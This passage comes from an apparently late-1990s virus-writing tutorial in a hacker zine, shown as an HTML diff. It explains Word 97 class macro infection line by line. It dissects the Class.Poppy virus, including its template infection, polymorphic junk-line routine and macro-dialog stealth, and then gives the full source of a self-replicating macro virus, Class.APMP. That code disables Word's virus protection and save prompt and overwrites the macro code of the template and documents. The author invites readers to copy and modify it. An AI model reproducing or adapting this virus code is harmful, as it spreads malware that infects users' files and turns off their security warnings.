+If Day(Now) = 31 Then MsgBox "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•" + _
+Chr$(13) + "•  VicodinES /CB /TNN •" + Chr$(13) + _
+"•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•", 0, "This Is Class"
+---------------------------------------------------------------------------
+
+    This here is one line, just delete the underscores ' _ '.  This line is
+the payload of  Class.Poppy.  On every 31 day of the  current month it will
+display a message box.
+
+---------------------------------------------------------------------------
+If nt = 0 Then
+ 
+    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
+ 
+    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
+ 
+End If
+---------------------------------------------------------------------------
+
+    If there is no code in the class object  of the template then we set an
+object variable called ' host ' to the class object of template. This means
+that our new host will be the class object of the template. Then export our
+viral code from the class object of document into the file  'c:\class.sys'.
+
+---------------------------------------------------------------------------
+If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
+---------------------------------------------------------------------------
+
+    If there is no code  in the class  object of the document,  then we set
+the object variable to the class object of the active document. It is clear
+that we don't need to export the source, because if the code is in template
+then we already exported our source on the first infection.
+
+---------------------------------------------------------------------------
+If nt &gt; 0 And ad &gt; 0 Then GoTo out
+---------------------------------------------------------------------------
+
+    If there is already code in both available class objects,  template and
+document, the jump to our label 'out'. This means that the template and the
+document could be already infected by a virus or whatever.
+
+---------------------------------------------------------------------------
+host.codemodule.AddFromFile ("c:\class.sys")
+---------------------------------------------------------------------------
+
+    If there is something to infect, we go on with this command, which will
+insert the code from the exported file 'c:\class.sys'. Remember what I told
+you about the four lines in exported code which we don't need?  The will be
+imported now, so Class.Poppy deletes them with the following lines of code.
+
+---------------------------------------------------------------------------
+With host.codemodule
+ 
+    For x = 1 To 4
+ 
+    .deletelines 1
+ 
+    Next x
+ 
+End With
+---------------------------------------------------------------------------
+
+    This piece of code will delete the  first line of code  in our new host
+four times. If you look back to the infection technics, you will find there
+a shorter piece of code that has the same effect.
+
+---------------------------------------------------------------------------
+If nt = 0 Then
+ 
+    With host.codemodule
+ 
+    .replaceline 1, "Sub AutoClose()"
+ 
+    .replaceline 69, "Sub ViewVBCode()"
+    
+    End With
+ 
+End If
+---------------------------------------------------------------------------
+
+    Remember what I told you about public and private routines in class ob-
+jects? Class.Poppy uses public routines, AutoOpen and AutoClose, so we need
+to change them. As you see, if the number of lines in template is zero then
+we have currently infected it and we need to change the first line, the sub
+that our code won't crash.  We also have to change line  69,  where the our
+stealth sub is located. I did this little graphic here for you that you can
+understand better what I mean.
+
+  .------------.        .-----------.  If a document infects a template,
+  |  Document  |        |  Template |  then AutoOpen gets AutoClose and
+  .------------.  ---&gt;  .-----------.  ToolsMacro gets ViewVBCode which
+  |  AutoOpen  |        | AutoClose |  is our stealth. Both,  infection
+  .------------.  &lt;---  .-----------.  and stealth, are public routines
+  | ToolsMacro |        | ViewVBCode|  so our code will  crash if we do
+  `------------´        `-----------´  not change it.
+
+---------------------------------------------------------------------------
+With host.codemodule
+ 
+    For x = 2 To 70 Step 2
+ 
+    .replaceline x, "'" & Application.UserName & Now &
+      Application.ActivePrinter & Now
+ 
+    Next x
+
+End With
+---------------------------------------------------------------------------
+
+    This here is a polymorphic routine,  a very simple one,  but it was the
+very first ever for macros.  As you see in the original  source code above,
+every second line is empty. So this routine called  VSMP  does nothing else
+then inserting junk code into every empty line,  but more on this engine in
+the part about polymorphism.
+
+---------------------------------------------------------------------------
+out:
+---------------------------------------------------------------------------
+    
+    Hey, this is our error label. On error the code below will be executed
+
+---------------------------------------------------------------------------
+If nt &lt;&gt; 0 And ad = 0 Then ActiveDocument.SaveAs ActiveDocument.FullName
+---------------------------------------------------------------------------
+
+    This is one line! So if the number of lines in the template is not zero
+and the lines of code in document  was zero then it is logical that we just
+have infected a document, so we need to save it under it's fullname.
+
+---------------------------------------------------------------------------
+End Sub
+---------------------------------------------------------------------------
+
+    No comment :)
+
+---------------------------------------------------------------------------
+Sub ToolsMacro()
+
+End Sub
+---------------------------------------------------------------------------
+
+    Right, this is our stealth for the document.  It intercepts the display
+of the macro dialog. In template this will get to 'Sub ViewVBCode()'.
+
+    So may you wonder  why I choosed this one,  Class.Poppy,  the answer is
+very easy. It was the very very first class macro ever! Written by Mr. Vic!
+So every class macro that you find nowadays build on this first one. Thanks
+VicodinES! Just toy around with this code until you understand how it works
+then go on with the next chapter, more advanced class technics...
+
+<b>
+.Class macro advanced technics</b>
+
+    After toying  around with the  basics of class  infection and infection
+technics, we finally can go on with some more advanced class technics. I am
+always on the look  out for new infection technics,  because they  are very
+important. You will see that the ways of coding class have changed a bit. I
+personally don't see any sense in coding a module macro for spreading nowa-
+days, because modules can be scanned by their names. This doesn't mean that
+module macros are bad, it's kewl cause you can realize better stealth tech,
+but you learned the module macros here to understand the very basics of it.
+Also this guide handles with every kind of macros! ;) So to learn about the
+advanced technics, let us take a close look on some good source codes after
+I explained some general things.
+
+
+    First of all, it is much better to use private routines like I told you
+on the infection hooks part. I am talking about these ones:
+
+  Private Sub Document_New()
+  Private Sub Document_Open()
+  Private Sub Document_Close()
+
+    This are the three available  private infection hooks for class macros.
+Of course you can also use the AutoMacros but it is much better to use this
+private ones.
+
+ .Private Sub Document_New()
+
+    Easy, this routine starts on  making a new document,  perfect to infect
+every new document. Good in combo with Document_Open, but it is much better
+to use only  Document_Close,  because it will have  the same result  as the
+first ones together.
+
+ .Private Sub Document_Open()
+
+    On opening an  existing document,  our viral code in  this routine gets
+very active ;)
+
+ .Private Sub Document_Close()
+
+    In my opinion  the best infection hook which is available for class in-
+fections. It combines Open and New, because every opened or new document is
+getting closed.
+
+    These infection hooks  are all private,  so you don't  have to exchange
+them in document or template.  They will  remain the same.  Here again some
+graphic to explain it better.
+
+
+  .---------------.        .---------------.  
+  |    Document   |  ---&gt;  |    Template   |  As you see the hook remains
+  .---------------.        .---------------.  the same in both,  document
+  | Document_Open |  &lt;---  | Document_Open |  and template.
+  `---------------´        `---------------´  
+
+    The same counts for Open and New, the hook can remain without crashing.
+If you need for example a second routine for payload, encryption, etc. then
+use a private one,  so that it can remain with the same name in document or
+template.
+
+    First I will show you a  very basic advanced  class macro.  It's called
+Class.APMP and  written for the only  purpose as an instructional virus for
+this tutorial, so feel free and copy the code and modify it.
+
+
+---[ code starts here ]----------------------------------------------------
+
+'APMP
+Private Sub Document_Open()
+On Error Resume Next
+Application.DisplayStatusBar = False
+Options.VirusProtection = False
+Options.SaveNormalPrompt = False
+OurCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 20)
+Set Host = NormalTemplate.VBProject.VBComponents(1).CodeModule
+If ThisDocument = NormalTemplate Then _
+ Set Host = ActiveDocument.VBProject.VBComponents(1).CodeModule
+With Host
+ If .Lines(1, 1) &lt;&gt; "'APMP" Then
+     .DeleteLines 1, .CountOfLines
+     .InsertLines 1, OurCode
+     If ThisDocument = NormalTemplate Then _
+      ActiveDocument.SaveAs ActiveDocument.FullName
+ End If
+End With
+MsgBox "Basic class macro by jackie", 0, "APMP"
+End Sub
+
+---[ code ends here ]------------------------------------------------------
+
+
+    As you see,  this code is much  shorter than the original one of Class.
+Poppy. Well, I will now walk throug every line of code,  so that you under-
+stand everything. First, this virus has no stealth and a message payload.
+
+---------------------------------------------------------------------------
+'APMP
+---------------------------------------------------------------------------
+
+    Well, this is our infection marker.  Our virus checks if this marker is
+present in the  first line of the class object.  It is just a comment which
+identifies our virus.
+
+---------------------------------------------------------------------------
+Private Sub Document_Open()
+---------------------------------------------------------------------------
+
+    As you heard, this macro gets active on opening. Remember the 'Private'
+in front of the sub routine. We don't need to change it.
+
+---------------------------------------------------------------------------
+On Error Resume Next
+---------------------------------------------------------------------------
+
+    If an error happens, just execute the next command.
+
+---------------------------------------------------------------------------
+Application.DisplayStatusBar = False
+Options.VirusProtection = False
+Options.SaveNormalPrompt = False
+---------------------------------------------------------------------------
+
+    Again the basic commands of a macro.
+
+---------------------------------------------------------------------------
+OurCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 20)
+---------------------------------------------------------------------------
+
+    Save the whole virus code into the variable  'OurCode' . Remember,  our
+code starts from line one until 19, because it's 19 lines long. ;)
+
+---------------------------------------------------------------------------
+Set Host = NormalTemplate.VBProject.VBComponents(1).CodeModule
+---------------------------------------------------------------------------
+
+    Set our class object to infect in the template.
+
+---------------------------------------------------------------------------
+If ThisDocument = NormalTemplate Then _
+ Set Host = ActiveDocument.VBProject.VBComponents(1).CodeModule
+---------------------------------------------------------------------------
+
+   So, if the executed code is in the template, we should switch the object
+variable to the active document, that we can infect it.
+
+---------------------------------------------------------------------------
+With Host
+ If .Lines(1, 1) &lt;&gt; "'APMP" Then
+     .DeleteLines 1, .CountOfLines
+     .InsertLines 1, OurCode
+     If ThisDocument = NormalTemplate Then _
+      ActiveDocument.SaveAs ActiveDocument.FullName
+ End If
+End With
+---------------------------------------------------------------------------
+
+    First we check  if the first line of the class object we want to infect
+isn't our marker.  If it isn't so we delete  all lines in the class object,
+then we insert our viral code into it. So if we have just infected a docum-
+ent, we should save it under it's fullname.
+
+---------------------------------------------------------------------------
+MsgBox "Basic class macro by jackie", 0, "APMP"
+---------------------------------------------------------------------------
+
+    Hehe, this is our payload.
+
+---------------------------------------------------------------------------
+End Sub
+---------------------------------------------------------------------------
+
+    No comment ;)
+
+    What you see here is the common infection technic which I use in my lil
+creations. It is very fast and small, the smaller the better, hehehe. There
+was also a smallest macro virus contest,  if you want to take a look on it,
+just get  LineZer0 Network Zine #2  and read the full article about it plus
+full commented source codes.
+
+    Well, here the Word 97 part ends.  I hope I could help you with it.  If
+you don't understand something or have any comments or questions, feel free
+and mail me.  Maybe I should tell you,  that you have one problem,  because
+there are too much,  I say too much bad Word macros around.  So I hope this
+tutorial can help  you to write  some good macros,  which aren't as lame as
+most of the macros out there! Now spotlight on Excel!
+
+                               -End Of Part #2-
+
+<b>=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+
+</pre>
+</blockquote>
+</BODY>
+</HTML>
